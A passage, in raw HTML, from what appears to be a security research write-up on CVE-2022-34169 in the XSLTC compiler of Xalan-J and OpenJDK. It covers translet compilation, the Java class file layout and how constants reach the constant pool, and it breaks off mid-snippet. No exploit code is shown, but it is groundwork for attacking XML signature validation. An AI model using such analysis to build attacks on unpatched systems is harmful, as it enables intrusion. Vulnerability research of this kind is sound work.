font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> project. OpenJDK forked Xalan-J, a Java based XSLT runtime, to provide XSLT support as part of Javas standard library. While the original Apache project has a number of features that are not supported in the OpenJDK fork, most of the core code is identical and CVE-2022-34169 affected both codebases.&nbsp;</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">XSLTC is responsible for compiling XSLT stylesheets into Java classes to improve performance compared to a naive interpretation based approach. While this has advantages when repeatedly running the same stylesheet over large amounts of data, it is a somewhat surprising choice in the context of XML signature validation. Thinking about this from an attacker's perspective, we can now provide arbitrary inputs to a fully-featured JIT compiler. Talk about an unexpected attack surface!&nbsp;</span></p><br /><h2 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;"><span style="font-family: Arial; font-size: 16pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;">A bug in XSLTC</span></h2><div align="left" dir="ltr" style="margin-left: 0pt;"><table style="border-collapse: collapse; border: none;"><colgroup></colgroup><tbody><tr style="height: 0pt;"><td style="background-color: #fafafa; border-bottom: solid #e0e0e0 1pt; border-left: solid #e0e0e0 1pt; border-right: solid #e0e0e0 1pt; border-top: solid #e0e0e0 1pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #455a64; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> &nbsp; &nbsp; /**</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #455a64; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;* As Gregor Samsa awoke one morning from uneasy dreams he found himself</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #455a64; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;* transformed in his bed into a gigantic insect. He was lying on his hard,</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #455a64; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;* as it were armour plated, back, and if he lifted his head a little he</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #455a64; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;* could see his big, brown belly divided into stiff, arched segments, on</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #455a64; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;* top of which the bed quilt could hardly keep in position and was about</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #455a64; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;* to slide off completely. His numerous legs, which were pitifully thin</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #455a64; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;* compared to the rest of his bulk, waved helplessly before his eyes.</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #455a64; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;* "What has happened to me?", he thought. It was no dream....</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #455a64; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">protected</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">final</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">static</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #3367d6; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">String</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> DEFAULT_TRANSLET_NAME </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #0f9d58; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">"GregorSamsa"</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">;</span></p></td></tr><tr style="height: 0pt;"><td style="background-color: #fafafa; border-bottom: solid #e0e0e0 1pt; border-left: solid #e0e0e0 1pt; border-right: solid #e0e0e0 1pt; border-top: solid #e0e0e0 1pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><a href="https://github.com/openjdk/jdk/blob/98d54e8eb2c37f44f0ffddedfddacd4876f2a027/src/java.xml/share/classes/com/sun/org/apache/xalan/internal/xsltc/trax/TransformerFactoryImpl.java#L128" style="text-decoration-line: none;"><span style="background-color: transparent; color: #1155cc; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;">Turns out</span></a><span style="background-color: transparent; color: #455a64; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> that the author of this codebase was a Kafka fan.&nbsp;</span></p></td></tr></tbody></table></div><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">So what does this compilation process look like? XSLTC takes a XSLT stylesheet as input and returns a JIT'ed Java class, called translet, as output. The JVM then loads this class, constructs it and the XSLT runtime executes the transformation via a JIT'ed method.&nbsp;</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Java class files contain the JVM bytecode for all class methods, a so-called constant pool describing all constants used and other important runtime details such as the name of its super class or access flags.&nbsp;</span></p><br /><div align="left" dir="ltr" style="margin-left: 0pt;"><table style="border-collapse: collapse; border: none;"><colgroup><col width="740"></col></colgroup><tbody><tr style="height: 0pt;"><td style="background-color: #fafafa; border-bottom: solid #e0e0e0 1pt; border-left: solid #e0e0e0 1pt; border-right: solid #e0e0e0 1pt; border-top: solid #e0e0e0 1pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #3367d6; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">//</span><span style="background-color: transparent; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> https://docs.oracle.com/javase/specs/jvms/se18/html/jvms-4.html</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #3367d6; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">ClassFile</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">{</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u4 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; magic</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u2 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; minor_version</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u2 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; major_version</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u2 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; constant_pool_count</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;cp_info&nbsp; &nbsp; &nbsp; &nbsp; constant_pool</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">[</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">constant_pool_count</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">-</span><span style="background-color: transparent; color: #c53929; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">1</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">]; // cp_info is a variable-sized object</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u2 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; access_flags</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u2 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; this_class</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u2 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; super_class</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u2 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; interfaces_count</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u2 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; interfaces</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">[</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">interfaces_count</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">];</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u2 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; fields_count</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;field_info &nbsp; &nbsp; fields</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">[</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">fields_count</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">];</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u2 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; methods_count</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;method_info&nbsp; &nbsp; methods</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">[</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">methods_count</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">];</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u2 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; attributes_count</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;attribute_info attributes</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">[</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">attributes_count</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">];</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">}</span></p></td></tr></tbody></table></div><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">XSLTC depends on the Apache Byte Code Engineering Library (BCEL) to dynamically create Java class files. As part of the compilation process, constants in the XSLT input such as Strings or Numbers get translated into Java constants, which are then stored in the constant pool. The following code snippet shows how an XSLT integer expression gets compiled: Small integers that fit into a byte or short are stored inline in bytecode using the </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">bipush</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> or </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">sipush</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> instructions. Larger ones are added to the constant pool using the </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">cp.addInteger</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> method:</span></p><br /><div align="left" dir="ltr" style="margin-left: 0pt;"><table style="border-collapse: collapse; border: none;"><colgroup></colgroup><tbody><tr style="height: 0pt;"><td style="background-color: #fafafa; border-bottom: solid #e0e0e0 1pt; border-left: solid #e0e0e0 1pt; border-right: solid #e0e0e0 1pt; border-top: solid #e0e0e0 1pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #455a64; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">// org/apache/xalan/xsltc/compiler/IntExpr.java</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">public</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">void</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> translate</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">(</span><span style="background-color: transparent; color: #3367d6; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">ClassGenerator</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> classGen</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">,</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #3367d6; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">MethodGenerator</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> methodGen</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">)</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">{</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #3367d6; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">ConstantPoolGen</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> cpg </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> classGen</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">.</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">getConstantPool</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">();</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #3367d6; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: 